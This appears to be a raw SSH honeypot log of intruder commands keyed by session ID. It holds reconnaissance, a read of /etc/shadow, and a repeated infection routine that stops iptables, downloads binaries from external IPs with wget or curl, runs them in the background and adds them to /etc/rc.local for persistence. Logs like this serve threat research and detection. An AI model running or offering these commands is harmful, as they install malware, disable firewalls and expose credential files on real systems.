ceed109bfaec4633afe4872c6bc1f336	ps x
0ebeb3477a9441868f276bfe7bda2053	uname
0ebeb3477a9441868f276bfe7bda2053	free -m
0ebeb3477a9441868f276bfe7bda2053	ps x
5479792bf183427484f7aa4ee3f8eb85	uname
5479792bf183427484f7aa4ee3f8eb85	free -m
5479792bf183427484f7aa4ee3f8eb85	ps x
cbba69ef52394cfea45982936fedf65f	uname
cbba69ef52394cfea45982936fedf65f	free -m
cbba69ef52394cfea45982936fedf65f	ps x
e7e863eb2fa34eb6a70f4976f49a78db	uname
e7e863eb2fa34eb6a70f4976f49a78db	free -m
e7e863eb2fa34eb6a70f4976f49a78db	ps x
07991cd648464c51b0f52dc5dc32406d	uname
07991cd648464c51b0f52dc5dc32406d	free -m
07991cd648464c51b0f52dc5dc32406d	ps x
9ded3555bb4e4e7aa2de990f565bfee2	uname
9ded3555bb4e4e7aa2de990f565bfee2	free -m
9ded3555bb4e4e7aa2de990f565bfee2	ps x
bc1f4fbfe07744b0b7a061465efaedee	uname
bc1f4fbfe07744b0b7a061465efaedee	free -m
bc1f4fbfe07744b0b7a061465efaedee	ps x
2d56303b969b49b08584161f30811ed7	uname
2d56303b969b49b08584161f30811ed7	free -m
2d56303b969b49b08584161f30811ed7	ps x
41e55ec12c094369a1e6b6e60d7563cd	uname
41e55ec12c094369a1e6b6e60d7563cd	free -m
41e55ec12c094369a1e6b6e60d7563cd	ps x
8b5e6f7dbd7d4c688dd679cac940f154	uname
8b5e6f7dbd7d4c688dd679cac940f154	free -m
8b5e6f7dbd7d4c688dd679cac940f154	ps x
59b80c74f687404180e1443f17f815c3	uname
59b80c74f687404180e1443f17f815c3	free -m
59b80c74f687404180e1443f17f815c3	ps x
34907eebe5a14c6789567e6ca2476731	uname
34907eebe5a14c6789567e6ca2476731	free -m
34907eebe5a14c6789567e6ca2476731	ps x
0559575f9e9341efb368bc4d41abf847	uname
0559575f9e9341efb368bc4d41abf847	free -m
0559575f9e9341efb368bc4d41abf847	ps x
2dafbe55650c45a8b2c56c808c72c91d	uname
2dafbe55650c45a8b2c56c808c72c91d	free -m
2dafbe55650c45a8b2c56c808c72c91d	ps x
84904ea8094946ac85e973f36775aeef	uname
84904ea8094946ac85e973f36775aeef	free -m
84904ea8094946ac85e973f36775aeef	ps x
c440584e0856454fb3ef8f20df0e30af	uname
c440584e0856454fb3ef8f20df0e30af	free -m
c440584e0856454fb3ef8f20df0e30af	ps x
6e56cb995ce84f7c99d2cead6c16d839	uname
6e56cb995ce84f7c99d2cead6c16d839	free -m
6e56cb995ce84f7c99d2cead6c16d839	ps x
8d05e71c76b141df89f2d4db3127690b	uname
8d05e71c76b141df89f2d4db3127690b	free -m
8d05e71c76b141df89f2d4db3127690b	ps x
d1a2ad7d3fdb4fd5a3f624d09ea07ec2	uname
d1a2ad7d3fdb4fd5a3f624d09ea07ec2	free -m
d1a2ad7d3fdb4fd5a3f624d09ea07ec2	ps x
4477bcbffcb54569b28c106d6510ea64	uname
4477bcbffcb54569b28c106d6510ea64	free -m
4477bcbffcb54569b28c106d6510ea64	ps x
fee25489e5754f03a1722f151b1f6fe0	uname
fee25489e5754f03a1722f151b1f6fe0	free -m
fee25489e5754f03a1722f151b1f6fe0	ps x
93b774b917a2463692d079e8cd2ae57f	uname
93b774b917a2463692d079e8cd2ae57f	free -m
93b774b917a2463692d079e8cd2ae57f	ps x
4b0dae3265ef47bf95e6cb2404185df2	uname
4b0dae3265ef47bf95e6cb2404185df2	free -m
4b0dae3265ef47bf95e6cb2404185df2	ps x
4dde4ade96424b9e8264a7c0b14a820e	uname
4dde4ade96424b9e8264a7c0b14a820e	free -m
4dde4ade96424b9e8264a7c0b14a820e	ps x
fbf891326851459aad5b898557db6aec	uname
fbf891326851459aad5b898557db6aec	free -m
fbf891326851459aad5b898557db6aec	ps x
95005824c11b4876ba091aa717408bb6	uname
95005824c11b4876ba091aa717408bb6	free -m
95005824c11b4876ba091aa717408bb6	ps x
81a4c3b04bc948d08a65fe192327f58e	uname
81a4c3b04bc948d08a65fe192327f58e	free -m
81a4c3b04bc948d08a65fe192327f58e	ps x
b53cad52f3ba4796b32c2d8c89e7e788	uname
b53cad52f3ba4796b32c2d8c89e7e788	free -m
b53cad52f3ba4796b32c2d8c89e7e788	ps x
ccaeb051c7fe448fafe82732a945e4de	uname
ccaeb051c7fe448fafe82732a945e4de	free -m
ccaeb051c7fe448fafe82732a945e4de	ps x
fe2ad9f63e6b4e45b0f9b9c28b016fd9	uname
fe2ad9f63e6b4e45b0f9b9c28b016fd9	free -m
fe2ad9f63e6b4e45b0f9b9c28b016fd9	ps x
0dd1e9f0c5d041cf9718fc9e13720330	uname
0dd1e9f0c5d041cf9718fc9e13720330	free -m
0dd1e9f0c5d041cf9718fc9e13720330	ps x
e60a2695ee304f18a8d9cf6d1b382166	uname
e60a2695ee304f18a8d9cf6d1b382166	free -m
e60a2695ee304f18a8d9cf6d1b382166	ps x
2d3b38be6bf04c2e8eccc227a4a6d3b0	uname
2d3b38be6bf04c2e8eccc227a4a6d3b0	free -m
2d3b38be6bf04c2e8eccc227a4a6d3b0	ps x
323802f1f19c466db885155c468b774b	uname
323802f1f19c466db885155c468b774b	free -m
323802f1f19c466db885155c468b774b	ps x
0902b3b36a07430192186725af7066b5	uname
0902b3b36a07430192186725af7066b5	free -m
0902b3b36a07430192186725af7066b5	ps x
0e9547ade3f1455fab94035424402208	uname
0e9547ade3f1455fab94035424402208	free -m
0e9547ade3f1455fab94035424402208	ps x
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	dir
4278d172210d415fa6b68e70ec19f85a	cd ..
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	dir
4278d172210d415fa6b68e70ec19f85a	cd /var
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	cd /home
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	cd /home/richard
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	ifconfig
4278d172210d415fa6b68e70ec19f85a	cd /
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	cd /root
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	cd /
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	ls -l
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	dir
4278d172210d415fa6b68e70ec19f85a	arp -a
4278d172210d415fa6b68e70ec19f85a	uname
48cff1d660f74b2a87b9dd769b1c39a7	ls
48cff1d660f74b2a87b9dd769b1c39a7	cd /
48cff1d660f74b2a87b9dd769b1c39a7	ls
48cff1d660f74b2a87b9dd769b1c39a7	cd /var
48cff1d660f74b2a87b9dd769b1c39a7	ls
48cff1d660f74b2a87b9dd769b1c39a7	cd /
48cff1d660f74b2a87b9dd769b1c39a7	cd /home
48cff1d660f74b2a87b9dd769b1c39a7	ls
48cff1d660f74b2a87b9dd769b1c39a7	cd /home/richard
48cff1d660f74b2a87b9dd769b1c39a7	ls
48cff1d660f74b2a87b9dd769b1c39a7	cd /
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	cd /bin
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	nisdomainname
4278d172210d415fa6b68e70ec19f85a	./nisdomainname
4278d172210d415fa6b68e70ec19f85a	nc
4278d172210d415fa6b68e70ec19f85a	ncat
4278d172210d415fa6b68e70ec19f85a	apt-get install net cat
4278d172210d415fa6b68e70ec19f85a	nc
4278d172210d415fa6b68e70ec19f85a	ncat
4278d172210d415fa6b68e70ec19f85a	net cat
4278d172210d415fa6b68e70ec19f85a	net cat --help
4278d172210d415fa6b68e70ec19f85a	sudo apt-get install nc
4278d172210d415fa6b68e70ec19f85a	apt-get install nc
4278d172210d415fa6b68e70ec19f85a	nc
4278d172210d415fa6b68e70ec19f85a	ls
4278d172210d415fa6b68e70ec19f85a	cd /
4278d172210d415fa6b68e70ec19f85a	./bin/nc --help
4278d172210d415fa6b68e70ec19f85a	nano
4278d172210d415fa6b68e70ec19f85a	ls /etc
4278d172210d415fa6b68e70ec19f85a	cat /etc/shadow
4278d172210d415fa6b68e70ec19f85a	cat /etc/shells
4278d172210d415fa6b68e70ec19f85a	ls /etc
4278d172210d415fa6b68e70ec19f85a	cd /etc/shells
4278d172210d415fa6b68e70ec19f85a	git
4278d172210d415fa6b68e70ec19f85a	apt-get install git
4278d172210d415fa6b68e70ec19f85a	git clone
48cff1d660f74b2a87b9dd769b1c39a7	adduser
48cff1d660f74b2a87b9dd769b1c39a7	adduser junin
48cff1d660f74b2a87b9dd769b1c39a7	clear
48cff1d660f74b2a87b9dd769b1c39a7	reset
48cff1d660f74b2a87b9dd769b1c39a7	ifconfig
48cff1d660f74b2a87b9dd769b1c39a7	traceroute www.google.com
48cff1d660f74b2a87b9dd769b1c39a7	tracert www.google.com
9b2ff12abcdd40e0ada5575892d73590	cd /tmp  |  |  cd /var/run  |  |  cd /mnt  |  |  cd /root  |  |  cd /
9b2ff12abcdd40e0ada5575892d73590	rm -f blj* blj.*
9b2ff12abcdd40e0ada5575892d73590	wget http://149.202.153.56/blj.sh  |  |  busybox wget http://149.202.153.56/blj.sh  |  |  curl -O http://149.202.153.56/blj.sh
414c2a44e07f42899b6f075c2166b46b	service iptables stop
3b47cce5d36c4134858bfc2ba703818c	service iptables stop
414c2a44e07f42899b6f075c2166b46b	wget http://61.160.6.122:801/liyxy
3b47cce5d36c4134858bfc2ba703818c	wget http://61.160.6.122:801/liyxy
3b47cce5d36c4134858bfc2ba703818c	chmod 0755 /root/liyxy
3b47cce5d36c4134858bfc2ba703818c	nohup /root/liyxy  >  /dev/null 2 > &1 &
3b47cce5d36c4134858bfc2ba703818c	chmod 777 liyxy
3b47cce5d36c4134858bfc2ba703818c	./liyxy
414c2a44e07f42899b6f075c2166b46b	chmod 0755 /root/liyxy
3b47cce5d36c4134858bfc2ba703818c	chmod 0755 /root/liyxy
414c2a44e07f42899b6f075c2166b46b	nohup /root/liyxy &gt
414c2a44e07f42899b6f075c2166b46b	/dev/null 2&gt
414c2a44e07f42899b6f075c2166b46b	&amp
414c2a44e07f42899b6f075c2166b46b	1 &amp
3b47cce5d36c4134858bfc2ba703818c	nohup /root/liyxy &gt
3b47cce5d36c4134858bfc2ba703818c	/dev/null 2&gt
3b47cce5d36c4134858bfc2ba703818c	&amp
3b47cce5d36c4134858bfc2ba703818c	1 &amp
414c2a44e07f42899b6f075c2166b46b	chmod 0777 liyxy
3b47cce5d36c4134858bfc2ba703818c	chmod 0777 liyxy
414c2a44e07f42899b6f075c2166b46b	chmod u+x liyxy
3b47cce5d36c4134858bfc2ba703818c	chmod u+x liyxy
414c2a44e07f42899b6f075c2166b46b	./liyxy &
3b47cce5d36c4134858bfc2ba703818c	./liyxy &
414c2a44e07f42899b6f075c2166b46b	chmod u+x liyxy
3b47cce5d36c4134858bfc2ba703818c	chmod u+x liyxy
414c2a44e07f42899b6f075c2166b46b	./liyxy &
3b47cce5d36c4134858bfc2ba703818c	./liyxy &
414c2a44e07f42899b6f075c2166b46b	cd /tmp
3b47cce5d36c4134858bfc2ba703818c	cd /tmp
414c2a44e07f42899b6f075c2166b46b	service iptables stop
3b47cce5d36c4134858bfc2ba703818c	service iptables stop
414c2a44e07f42899b6f075c2166b46b	wget http://61.160.6.122:801/liyxy
3b47cce5d36c4134858bfc2ba703818c	wget http://61.160.6.122:801/liyxy
414c2a44e07f42899b6f075c2166b46b	chmod 0755 /root/liyxy
3b47cce5d36c4134858bfc2ba703818c	chmod 0755 /root/liyxy
414c2a44e07f42899b6f075c2166b46b	nohup /root/liyxy  >  /dev/null 2 > &1 &
3b47cce5d36c4134858bfc2ba703818c	nohup /root/liyxy  >  /dev/null 2 > &1 &
414c2a44e07f42899b6f075c2166b46b	chmod 777 liyxy
3b47cce5d36c4134858bfc2ba703818c	chmod 777 liyxy
414c2a44e07f42899b6f075c2166b46b	./164
3b47cce5d36c4134858bfc2ba703818c	./164
414c2a44e07f42899b6f075c2166b46b	chmod 0755 /root/liyxy
3b47cce5d36c4134858bfc2ba703818c	chmod 0755 /root/liyxy
414c2a44e07f42899b6f075c2166b46b	nohup /root/liyxy &gt
414c2a44e07f42899b6f075c2166b46b	/dev/null 2&gt
414c2a44e07f42899b6f075c2166b46b	&amp
414c2a44e07f42899b6f075c2166b46b	1 &amp
3b47cce5d36c4134858bfc2ba703818c	nohup /root/liyxy &gt
3b47cce5d36c4134858bfc2ba703818c	/dev/null 2&gt
3b47cce5d36c4134858bfc2ba703818c	&amp
3b47cce5d36c4134858bfc2ba703818c	1 &amp
414c2a44e07f42899b6f075c2166b46b	chmod 0777 liyxy
3b47cce5d36c4134858bfc2ba703818c	chmod 0777 liyxy
414c2a44e07f42899b6f075c2166b46b	chmod u+x liyxy
3b47cce5d36c4134858bfc2ba703818c	chmod u+x liyxy
414c2a44e07f42899b6f075c2166b46b	./liyxy &
3b47cce5d36c4134858bfc2ba703818c	./liyxy &
414c2a44e07f42899b6f075c2166b46b	chmod u+x dos6cc4
3b47cce5d36c4134858bfc2ba703818c	chmod u+x dos6cc4
414c2a44e07f42899b6f075c2166b46b	./liyxy &
3b47cce5d36c4134858bfc2ba703818c	./liyxy &
414c2a44e07f42899b6f075c2166b46b	cd /tmp
3b47cce5d36c4134858bfc2ba703818c	cd /tmp
414c2a44e07f42899b6f075c2166b46b	echo "cd  /root/" >  > /etc/rc.local
3b47cce5d36c4134858bfc2ba703818c	echo "cd  /root/" >  > /etc/rc.local
414c2a44e07f42899b6f075c2166b46b	echo "./liyxy&" >  > /etc/rc.local
3b47cce5d36c4134858bfc2ba703818c	echo "./liyxy&" >  > /etc/rc.local
414c2a44e07f42899b6f075c2166b46b	echo "./liyxy&" >  > /etc/rc.local
3b47cce5d36c4134858bfc2ba703818c	echo "./liyxy&" >  > /etc/rc.local
414c2a44e07f42899b6f075c2166b46b	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
3b47cce5d36c4134858bfc2ba703818c	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
cbdbac0b5a524ea9b040e9ad8d44cc2a	service iptables stop
cbdbac0b5a524ea9b040e9ad8d44cc2a	wget http://61.160.6.122:801/liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	nohup /root/liyxy  >  /dev/null 2 > &1 &
cbdbac0b5a524ea9b040e9ad8d44cc2a	chmod 777 liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	./liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	chmod 0755 /root/liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	nohup /root/liyxy &gt
cbdbac0b5a524ea9b040e9ad8d44cc2a	/dev/null 2&gt
cbdbac0b5a524ea9b040e9ad8d44cc2a	&amp
cbdbac0b5a524ea9b040e9ad8d44cc2a	1 &amp
cbdbac0b5a524ea9b040e9ad8d44cc2a	chmod 0777 liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	chmod u+x liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	./liyxy &
cbdbac0b5a524ea9b040e9ad8d44cc2a	chmod u+x liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	./liyxy &
cbdbac0b5a524ea9b040e9ad8d44cc2a	cd /tmp
cbdbac0b5a524ea9b040e9ad8d44cc2a	service iptables stop
cbdbac0b5a524ea9b040e9ad8d44cc2a	wget http://61.160.6.122:801/liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	nohup /root/liyxy  >  /dev/null 2 > &1 &
cbdbac0b5a524ea9b040e9ad8d44cc2a	chmod 777 liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	./164
cbdbac0b5a524ea9b040e9ad8d44cc2a	chmod 0755 /root/liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	nohup /root/liyxy &gt
cbdbac0b5a524ea9b040e9ad8d44cc2a	/dev/null 2&gt
cbdbac0b5a524ea9b040e9ad8d44cc2a	&amp
cbdbac0b5a524ea9b040e9ad8d44cc2a	1 &amp
cbdbac0b5a524ea9b040e9ad8d44cc2a	chmod 0777 liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	chmod u+x liyxy
cbdbac0b5a524ea9b040e9ad8d44cc2a	./liyxy &
cbdbac0b5a524ea9b040e9ad8d44cc2a	chmod u+x dos6cc4
cbdbac0b5a524ea9b040e9ad8d44cc2a	./liyxy &
cbdbac0b5a524ea9b040e9ad8d44cc2a	cd /tmp
cbdbac0b5a524ea9b040e9ad8d44cc2a	echo "cd  /root/" >  > /etc/rc.local
cbdbac0b5a524ea9b040e9ad8d44cc2a	echo "./liyxy&" >  > /etc/rc.local
cbdbac0b5a524ea9b040e9ad8d44cc2a	echo "./liyxy&" >  > /etc/rc.local
cbdbac0b5a524ea9b040e9ad8d44cc2a	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
ad4473f472e342d89fe59f5357a1b5ac	service iptables stop
254e71d3961341198c44466372e1a99f	service iptables stop
ad4473f472e342d89fe59f5357a1b5ac	wget http://61.160.6.122:801/liyxy
254e71d3961341198c44466372e1a99f	wget http://61.160.6.122:801/liyxy
254e71d3961341198c44466372e1a99f	chmod 0755 /root/liyxy
ad4473f472e342d89fe59f5357a1b5ac	nohup /root/liyxy  >  /dev/null 2 > &1 &
254e71d3961341198c44466372e1a99f	nohup /root/liyxy  >  /dev/null 2 > &1 &
ad4473f472e342d89fe59f5357a1b5ac	chmod 777 liyxy
254e71d3961341198c44466372e1a99f	chmod 777 liyxy
ad4473f472e342d89fe59f5357a1b5ac	./liyxy
254e71d3961341198c44466372e1a99f	./liyxy
ad4473f472e342d89fe59f5357a1b5ac	chmod 0755 /root/liyxy
254e71d3961341198c44466372e1a99f	chmod 0755 /root/liyxy
ad4473f472e342d89fe59f5357a1b5ac	nohup /root/liyxy &gt
ad4473f472e342d89fe59f5357a1b5ac	/dev/null 2&gt
ad4473f472e342d89fe59f5357a1b5ac	&amp
ad4473f472e342d89fe59f5357a1b5ac	1 &amp
254e71d3961341198c44466372e1a99f	nohup /root/liyxy &gt
254e71d3961341198c44466372e1a99f	/dev/null 2&gt
254e71d3961341198c44466372e1a99f	&amp
254e71d3961341198c44466372e1a99f	1 &amp
ad4473f472e342d89fe59f5357a1b5ac	chmod 0777 liyxy
254e71d3961341198c44466372e1a99f	chmod 0777 liyxy
ad4473f472e342d89fe59f5357a1b5ac	chmod u+x liyxy
254e71d3961341198c44466372e1a99f	chmod u+x liyxy
ad4473f472e342d89fe59f5357a1b5ac	./liyxy &
254e71d3961341198c44466372e1a99f	./liyxy &
ad4473f472e342d89fe59f5357a1b5ac	chmod u+x liyxy
254e71d3961341198c44466372e1a99f	chmod u+x liyxy
ad4473f472e342d89fe59f5357a1b5ac	./liyxy &
254e71d3961341198c44466372e1a99f	./liyxy &
ad4473f472e342d89fe59f5357a1b5ac	cd /tmp
254e71d3961341198c44466372e1a99f	cd /tmp
ad4473f472e342d89fe59f5357a1b5ac	service iptables stop
254e71d3961341198c44466372e1a99f	service iptables stop
ad4473f472e342d89fe59f5357a1b5ac	wget http://61.160.6.122:801/liyxy
254e71d3961341198c44466372e1a99f	wget http://61.160.6.122:801/liyxy
254e71d3961341198c44466372e1a99f	chmod 0755 /root/liyxy
ad4473f472e342d89fe59f5357a1b5ac	nohup /root/liyxy  >  /dev/null 2 > &1 &
254e71d3961341198c44466372e1a99f	nohup /root/liyxy  >  /dev/null 2 > &1 &
ad4473f472e342d89fe59f5357a1b5ac	chmod 777 liyxy
254e71d3961341198c44466372e1a99f	chmod 777 liyxy
ad4473f472e342d89fe59f5357a1b5ac	./164
254e71d3961341198c44466372e1a99f	./164
ad4473f472e342d89fe59f5357a1b5ac	chmod 0755 /root/liyxy
254e71d3961341198c44466372e1a99f	chmod 0755 /root/liyxy
ad4473f472e342d89fe59f5357a1b5ac	nohup /root/liyxy &gt
ad4473f472e342d89fe59f5357a1b5ac	/dev/null 2&gt
ad4473f472e342d89fe59f5357a1b5ac	&amp
ad4473f472e342d89fe59f5357a1b5ac	1 &amp
254e71d3961341198c44466372e1a99f	nohup /root/liyxy &gt
254e71d3961341198c44466372e1a99f	/dev/null 2&gt
254e71d3961341198c44466372e1a99f	&amp
254e71d3961341198c44466372e1a99f	1 &amp
ad4473f472e342d89fe59f5357a1b5ac	chmod 0777 liyxy
254e71d3961341198c44466372e1a99f	chmod 0777 liyxy
ad4473f472e342d89fe59f5357a1b5ac	chmod u+x liyxy
254e71d3961341198c44466372e1a99f	chmod u+x liyxy
ad4473f472e342d89fe59f5357a1b5ac	./liyxy &
254e71d3961341198c44466372e1a99f	./liyxy &
ad4473f472e342d89fe59f5357a1b5ac	chmod u+x dos6cc4
254e71d3961341198c44466372e1a99f	chmod u+x dos6cc4
ad4473f472e342d89fe59f5357a1b5ac	./liyxy &
254e71d3961341198c44466372e1a99f	./liyxy &
ad4473f472e342d89fe59f5357a1b5ac	cd /tmp
254e71d3961341198c44466372e1a99f	cd /tmp
ad4473f472e342d89fe59f5357a1b5ac	echo "cd  /root/" >  > /etc/rc.local
254e71d3961341198c44466372e1a99f	echo "cd  /root/" >  > /etc/rc.local
ad4473f472e342d89fe59f5357a1b5ac	echo "./liyxy&" >  > /etc/rc.local
254e71d3961341198c44466372e1a99f	echo "./liyxy&" >  > /etc/rc.local
ad4473f472e342d89fe59f5357a1b5ac	echo "./liyxy&" >  > /etc/rc.local
254e71d3961341198c44466372e1a99f	echo "./liyxy&" >  > /etc/rc.local
ad4473f472e342d89fe59f5357a1b5ac	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
254e71d3961341198c44466372e1a99f	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
51e1a1800a174e6cb7c985080243b043	service iptables stop
51e1a1800a174e6cb7c985080243b043	wget http://61.160.6.122:801/liyxy
51e1a1800a174e6cb7c985080243b043	chmod 0755 /root/liyxy
51e1a1800a174e6cb7c985080243b043	nohup /root/liyxy  >  /dev/null 2 > &1 &
51e1a1800a174e6cb7c985080243b043	chmod 777 liyxy
51e1a1800a174e6cb7c985080243b043	./liyxy
51e1a1800a174e6cb7c985080243b043	chmod 0755 /root/liyxy
51e1a1800a174e6cb7c985080243b043	nohup /root/liyxy &gt
51e1a1800a174e6cb7c985080243b043	/dev/null 2&gt
51e1a1800a174e6cb7c985080243b043	&amp
51e1a1800a174e6cb7c985080243b043	1 &amp
51e1a1800a174e6cb7c985080243b043	chmod 0777 liyxy
51e1a1800a174e6cb7c985080243b043	chmod u+x liyxy
51e1a1800a174e6cb7c985080243b043	./liyxy &
51e1a1800a174e6cb7c985080243b043	chmod u+x liyxy
51e1a1800a174e6cb7c985080243b043	./liyxy &
51e1a1800a174e6cb7c985080243b043	cd /tmp
51e1a1800a174e6cb7c985080243b043	service iptables stop
51e1a1800a174e6cb7c985080243b043	wget http://61.160.6.122:801/liyxy
51e1a1800a174e6cb7c985080243b043	chmod 777 liyxy
51e1a1800a174e6cb7c985080243b043	./164
51e1a1800a174e6cb7c985080243b043	chmod 0755 /root/liyxy
51e1a1800a174e6cb7c985080243b043	nohup /root/liyxy &gt
51e1a1800a174e6cb7c985080243b043	/dev/null 2&gt
51e1a1800a174e6cb7c985080243b043	&amp
51e1a1800a174e6cb7c985080243b043	1 &amp
51e1a1800a174e6cb7c985080243b043	chmod 0777 liyxy
51e1a1800a174e6cb7c985080243b043	chmod u+x liyxy
51e1a1800a174e6cb7c985080243b043	./liyxy &
51e1a1800a174e6cb7c985080243b043	chmod u+x dos6cc4
51e1a1800a174e6cb7c985080243b043	./liyxy &
51e1a1800a174e6cb7c985080243b043	cd /tmp
51e1a1800a174e6cb7c985080243b043	echo "cd  /root/" >  > /etc/rc.local
51e1a1800a174e6cb7c985080243b043	echo "./liyxy&" >  > /etc/rc.local
51e1a1800a174e6cb7c985080243b043	echo "./liyxy&" >  > /etc/rc.local
51e1a1800a174e6cb7c985080243b043	echo "/etc/init.d/iptables stop" >  > /etc/rc.local
e7b6854640db4a24b6af9bd6a9e9da1c	service iptables stop
e7b6854640db4a24b6af9bd6a9e9da1c	wget http://61.160.6.122:801/lisxa
e7b6854640db4a24b6af9bd6a9e9da1c	chmod 0755 /root/lisxa
e7b6854640db4a24b6af9bd6a9e9da1c	nohup /root/lisxa  >  /dev/null 2 > &1 &
e7b6854640db4a24b6af9bd6a9e9da1c	chmod 777 lisxa
e7b6854640db4a24b6af9bd6a9e9da1c	./lisxa
e7b6854640db4a24b6af9bd6a9e9da1c	chmod 0755 /root/lisxa
e7b6854640db4a24b6af9bd6a9e9da1c	nohup /root/lisxa &gt
e7b6854640db4a24b6af9bd6a9e9da1c	/dev/null 2&gt
e7b6854640db4a24b6af9bd6a9e9da1c	&amp
e7b6854640db4a24b6af9bd6a9e9da1c	1 &amp
e7b6854640db4a24b6af9bd6a9e9da1c	chmod 0777 lisxa
e7b6854640db4a24b6af9bd6a9e9da1c	chmod u+x lisxa
e7b6854640db4a24b6af9bd6a9e9da1c	./lisxa &
e7b6854640db4a24b6af9bd6a9e9da1c	chmod u+x lisxa
e7b6854640db4a24b6af9bd6a9e9da1c	./lisxa &
e7b6854640db4a24b6af9bd6a9e9da1c	cd /tmp
e7b6854640db4a24b6af9bd6a9e9da1c	service iptables stop
e7b6854640db4a24b6af9bd6a9e9da1c	wget http://61.160.6.122:801/lisxa
79b37ef3f0a94e2890bec2903307660c	service iptables stop
79b37ef3f0a94e2890bec2903307660c	wget http://61.160.6.122:801/liyxy
79b37ef3f0a94e2890bec2903307660c	nohup /root/liyxy  >  /dev/null 2 > &1 &
79b37ef3f0a94e2890bec2903307660c	chmod 777 liyxy
79b37ef3f0a94e2890bec2903307660c	./liyxy
79b37ef3f0a94e2890bec2903307660c	chmod 0755 /root/liyxy
79b37ef3f0a94e2890bec2903307660c	nohup /root/liyxy &gt
79b37ef3f0a94e2890bec2903307660c	/dev/null 2&gt
79b37ef3f0a94e2890bec2903307660c	&amp
79b37ef3f0a94e2890bec2903307660c	1 &amp
79b37ef3f0a94e2890bec2903307660c	chmod 0777 liyxy
79b37ef3f0a94e2890bec2903307660c	chmod u+x liyxy
79b37ef3f0a94e2890bec2903307660c	./liyxy &
79b37ef3f0a94e2890bec2903307660c	chmod u+x liyxy
79b37ef3f0a94e2890bec2903307660c	./liyxy &
79b37ef3f0a94e2890bec2903307660c	cd /tmp
79b37ef3f0a94e2890bec2903307660c	service iptables stop
79b37ef3f0a94e2890bec2903307660c	wget http://61.160.6.122:801/liyxy
79b37ef3f0a94e2890bec2903307660c	nohup /root/liyxy  >  /dev/null 2 > &1 &
79b37ef3f0a94e2890bec2903307660c	chmod 777 liyxy
79b37ef3f0a94e2890bec2903307660c	./164
79b37ef3f0a94e2890bec2903307660c	chmod 0755 /root/liyxy
79b37ef3f0a94e2890bec2903307660c	nohup /root/liyxy &gt
79b37ef3f0a94e2890bec2903307660c	/dev/null 2&gt
79b37ef3f0a94e2890bec2903307660c	&amp
79b37ef3f0a94e2890bec2903307660c	1 &amp
79b37ef3f0a94e2890bec2903307660c	chmod 0777 liyxy
79b37ef3f0a94e2890bec2903307660c	chmod u+x liyxy
79b37ef3f0a94e2890bec2903307660c	./liyxy &
79b37ef3f0a94e2890bec2903307660c	chmod u+x dos6cc4
79b37ef3f0a94e2890bec2903307660c	./liyxy &
79b37ef3f0a94e2890bec2903307660c	cd /tmp
79b37ef3f0a94e2890bec2903307660c	echo "cd  /root/" >  > /etc/rc.local
